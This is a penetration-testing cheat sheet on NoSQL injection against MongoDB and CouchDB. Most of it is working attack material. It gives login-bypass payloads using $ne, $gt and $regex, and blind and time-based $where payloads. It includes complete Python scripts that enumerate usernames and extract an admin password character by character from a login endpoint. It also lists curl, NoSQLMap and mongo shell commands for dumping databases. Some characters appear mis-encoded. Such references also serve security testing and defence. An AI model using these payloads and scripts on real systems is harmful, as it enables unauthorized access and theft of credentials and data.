# NoSQL Injection

## Table of Contents

- [Overview](#overview)
- [Authentication Bypass](#authentication-bypass)
- [MongoDB Injection](#mongodb-injection)
- [CouchDB Injection](#couchdb-injection)
- [Blind NoSQL Injection](#blind-nosql-injection)
- [Operators Exploitation](#operators-exploitation)

---

## Overview

NoSQL injection occurs when user input is improperly sanitized before being used in NoSQL database queries. Unlike SQL injection, NoSQL databases use different query formats (JSON, BSON, etc.).

**Common NoSQL Databases:**

- MongoDB
- CouchDB
- Redis
- Cassandra

---

## Authentication Bypass

### JSON-based Injection

> Basic authentication bypass

```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

> Always true condition

```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

> Regex match all

```json
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

### URL Parameter Injection

> Using array notation

```text
username[$ne]=invalid&password[$ne]=invalid
```

> Using $gt operator

```text
username[$gt]=&password[$gt]=
```

> Using $regex operator

```text
username[$regex]=.*&password[$regex]=.*
```

> With admin user

```text
username=admin&password[$ne]=invalid
username=admin&password[$regex]=.*
```

### PHP Array Injection

> POST data as arrays

```text
username[$ne]=test&password[$ne]=test
```

> In Burp Suite (raw)

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username[$ne]=test&password[$ne]=test
```

---

## MongoDB Injection

### Query Operators

| Operator | Description | Example |
| :--- | :--- | :--- |
| `$eq` | Equals | `{"field": {"$eq": "value"}}` |
| `$ne` | Not equals | `{"field": {"$ne": "value"}}` |
| `$gt` | Greater than | `{"field": {"$gt": ""}}` |
| `$gte` | Greater or equal | `{"field": {"$gte": ""}}` |
| `$lt` | Less than | `{"field": {"$lt": "z"}}` |
| `$lte` | Less or equal | `{"field": {"$lte": "z"}}` |
| `$in` | In array | `{"field": {"$in": ["a","b"]}}` |
| `$nin` | Not in array | `{"field": {"$nin": ["a"]}}` |
| `$regex` | Regex match | `{"field": {"$regex": "^a"}}` |
| `$exists` | Field exists | `{"field": {"$exists": true}}` |
| `$or` | OR condition | `{"$or": [{...}, {...}]}` |
| `$and` | AND condition | `{"$and": [{...}, {...}]}` |
| `$where` | JavaScript | `{"$where": "this.x==this.y"}` |

### $where Injection

> Basic JavaScript injection

```json
{"$where": "1==1"}
```

> Sleep for time-based detection

```json
{"$where": "sleep(5000)"}
```

> Data exfiltration via time

```json
{"$where": "this.password.substr(0,1)=='a' || sleep(5000)"}
```

### Extracting Data via $regex

> Test if field starts with 'a'

```json
{"username": "admin", "password": {"$regex": "^a.*"}}
```

> Python script for extraction

```python
import requests
import string

url = "http://$rhost/login"
password = ""
chars = string.ascii_letters + string.digits + string.punctuation

while True:
    for c in chars:
        payload = {"username": "admin", "password": {"$regex": f"^{password}{c}.*"}}
        r = requests.post(url, json=payload)
        if "success" in r.text:
            password += c
            print(f"Found: {password}")
            break
    else:
        break

print(f"Password: {password}")
```

### Aggregation Pipeline Injection

> Inject into aggregation

```json
{"$match": {"$or": [{"username": "admin"}, {"1": "1"}]}}
```

---

## CouchDB Injection

### Mango Query Injection

> Basic query

```json
{
  "selector": {
    "username": {"$eq": "admin"},
    "password": {"$gt": null}
  }
}
```

> All documents

```json
{
  "selector": {
    "_id": {"$gt": null}
  }
}
```

### View Function Injection

> If JavaScript is enabled

```text
/db/_design/doc/_view/view?key="'; return 'pwned"
```

### CouchDB REST API

> List all databases

```shell
curl http://$rhost:5984/_all_dbs
```

> Get all documents

```shell
curl http://$rhost:5984/$database/_all_docs
```

> Get document content

```shell
curl http://$rhost:5984/$database/$doc_id
```

---

## Blind NoSQL Injection

### Boolean-based Blind

> True condition (login success)

```text
username=admin&password[$regex]=^a.*
```

> False condition (login fail)

```text
username=admin&password[$regex]=^z.*
```

### Time-based Blind

> Using $where with sleep (MongoDB)

```json
{"$where": "if(this.username=='admin') sleep(5000); else 0"}
```

> Character extraction with timing

```json
{"$where": "if(this.password.charAt(0)=='a') sleep(5000); else 0"}
```

### Error-based

> Invalid regex to trigger error

```text
username[$regex]=*&password=test
```

---

## Operators Exploitation

### Data Type Juggling

> Integer comparison

```json
{"count": {"$gt": 0}}
```

> Boolean injection

```json
{"active": {"$ne": false}}
```

### Array Operators

> $elemMatch

```json
{"items": {"$elemMatch": {"$gt": ""}}}
```

> $size

```json
{"items": {"$size": {"$gt": 0}}}
```

### Object Operators

> $type check

```json
{"field": {"$type": 2}}  // String type
```

---

## Enumeration Scripts

### Username Enumeration

```python
import requests
import string

url = "http://$rhost/login"
username = ""
chars = string.ascii_lowercase

while len(username) < 20:
    for c in chars:
        payload = {
            "username": {"$regex": f"^{username}{c}"},
            "password": {"$ne": ""}
        }
        r = requests.post(url, json=payload)
        if "success" in r.text or r.status_code == 200:
            username += c
            print(f"[+] Username: {username}")
            break
    else:
        break

print(f"[+] Complete username: {username}")
```

### Password Extraction

```python
import requests
import string

url = "http://$rhost/login"
password = ""
chars = string.ascii_letters + string.digits + "!@#$%^&*"

while len(password) < 50:
    for c in chars:
        # Escape special regex characters
        escaped = c if c not in "^$.*+?{}[]\\|()/" else f"\\{c}"
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{escaped}"}
        }
        r = requests.post(url, json=payload)
        if "success" in r.text:
            password += c
            print(f"[+] Password: {password}")
            break
    else:
        break

print(f"[+] Complete password: {password}")
```

---

## Tools

### NoSQLMap

> Automated NoSQL injection

```shell
python nosqlmap.py -u "http://$rhost/login" --data "username=admin&password=test"
```

### MongoDB Shell Injection

> Direct connection

```shell
mongo --host $rhost
mongo --host $rhost -u $username -p $password --authenticationDatabase admin
```

> In shell

```javascript
show dbs
use $database
show collections
db.$collection.find()
db.$collection.find().pretty()
```

---

## Quick Reference

### Authentication Bypass Payloads

| Payload | Type |
| :--- | :--- |
| `{"$ne": ""}` | Not empty |
| `{"$gt": ""}` | Greater than empty |
| `{"$regex": ".*"}` | Match all |
| `{"$exists": true}` | Field exists |
| `{"$in": ["admin", "root"]}` | In list |

### URL Encoded

```text
username[$ne]=x&password[$ne]=x
username[$gt]=&password[$gt]=
username[$regex]=^admin&password[$regex]=^.
username=admin&password[$regex]=^a.*
```

### Content-Type Variations

```text
application/json â†’ {"username": {"$ne": ""}}
application/x-www-form-urlencoded â†’ username[$ne]=test
```

---

## ðŸ“š See Also

### Related Web Attacks

- **[SQL Injection](7.1.SQL-Injection.md)** - Traditional SQL database injection
- **[Web Application Analysis](7.0.Web-Application-Analysis.md)** - Reconnaissance and vulnerability discovery
- **[Command Injection](7.4.Command-Injection.md)** - OS command execution
